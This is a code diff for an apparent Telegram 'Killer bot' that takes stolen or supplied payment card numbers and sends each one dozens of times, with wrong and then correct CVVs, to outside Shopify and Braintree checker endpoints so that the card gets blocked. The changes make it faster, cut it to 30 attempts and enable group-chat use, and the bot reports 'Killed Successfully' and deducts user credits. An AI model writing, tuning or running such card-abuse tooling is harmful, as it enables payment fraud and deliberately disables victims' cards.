@@ -26,9 +26,8 @@ SHOPIFY_SITES = [
 ]
 SHOPIFY_API_URL = "https://web-production-b4ec9.up.railway.app/shopify"
 
-# Braintree APIs
+# Braintree API (only one)
 BRAINTREE_API1 = "https://braintree-charged.onrender.com/braintree"
-BRAINTREE_API2 = "https://braintree-auth-48jf.onrender.com/b3"
 
 # Files
 DATA_FILE = "user_data.json"
@@ -187,7 +186,7 @@ async def check_braintree(api_url, card_str, context=None):
             await report_error_to_owner(context, f"Braintree API ({api_url})", str(e), card_str)
         return False, f"Error: {str(e)[:50]}"
 
-# ================= KILL SEQUENCE (ALWAYS 40) =================
+# ================= KILL SEQUENCE (FAST – 30 attempts) =================
 async def perform_full_kill(card_str, original_cvv, context):
     start_time = time.time()
     attempts = 0
@@ -205,7 +204,7 @@ async def perform_full_kill(card_str, original_cvv, context):
         last_shopify_resp = resp
         if dead:
             any_dead = True
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(0.3)  # reduced from 0.5 for speed
 
     # Phase 2: 10 correct CVV Shopify
     for _ in range(10):
@@ -214,7 +213,7 @@ async def perform_full_kill(card_str, original_cvv, context):
         last_shopify_resp = resp
         if dead:
             any_dead = True
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(0.3)
 
     # Phase 3: 10 Braintree API1
     for _ in range(10):
@@ -223,16 +222,7 @@ async def perform_full_kill(card_str, original_cvv, context):
         last_braintree_resp = resp
         if dead:
             any_dead = True
-        await asyncio.sleep(0.5)
-
-    # Phase 4: 10 Braintree API2
-    for _ in range(10):
-        attempts += 1
-        dead, resp = await check_braintree(BRAINTREE_API2, card_str, context=context)
-        last_braintree_resp = resp
-        if dead:
-            any_dead = True
-        await asyncio.sleep(0.5)
+        await asyncio.sleep(0.3)
 
     total_time = time.time() - start_time
     return any_dead, attempts, last_shopify_resp, last_braintree_resp, total_time
@@ -339,6 +329,7 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     full_text = update.message.text
+    # Remove the command prefix (works in groups too)
     if full_text.startswith('/ko'):
         full_text = full_text[3:].strip()
     elif full_text.startswith('/Ko'):
@@ -386,7 +377,7 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"[⌬] Cᴀʀᴅ↬ `{masked}|{month}|{year}|{cvv}`\n"
             f"[⌬] Gᴀᴛᴇᴡᴀʏ↬ Kɪʟʟᴇʀ \n"
             f"[⌬] Rᴇsᴘᴏɴsᴇ↬ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
-            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ 40 Tɪᴍᴇs \n"
+            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ 30 Tɪᴍᴇs \n"
             f"[⌬] Tɪᴍᴇ Tᴀᴋᴇɴ↣ {elapsed:.2f} Sᴇᴄᴏɴᴅs\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"[⌬] Rᴇǫᴜᴇsᴛ Bʏ↬ {update.effective_user.first_name}\n"
@@ -397,7 +388,7 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         result_text = (
             f"❌ *Kill failed!* No dead response from any gateway.\n"
-            f"Processed: 40 Times | Time: {elapsed:.2f}s\n"
+            f"Processed: 30 Times | Time: {elapsed:.2f}s\n"
             f"Last Shopify: `{shopify_resp[:80]}`\n"
             f"Last Braintree: `{braintree_resp[:80]}`\n"
             f"*No credits deducted.*"
@@ -506,7 +497,7 @@ def main():
     app.add_handler(CommandHandler("addadmin", addadmin))
     app.add_handler(CommandHandler("removeadmin", removeadmin))
     app.add_handler(CommandHandler("plan", plan_assign))
-    print("🔥 Killer bot is running...")
+    print("🔥 Killer bot is running (fast mode, groups enabled)...")
     print(f"👑 Owner ID: {OWNER_ID}")
     app.run_polling()
 
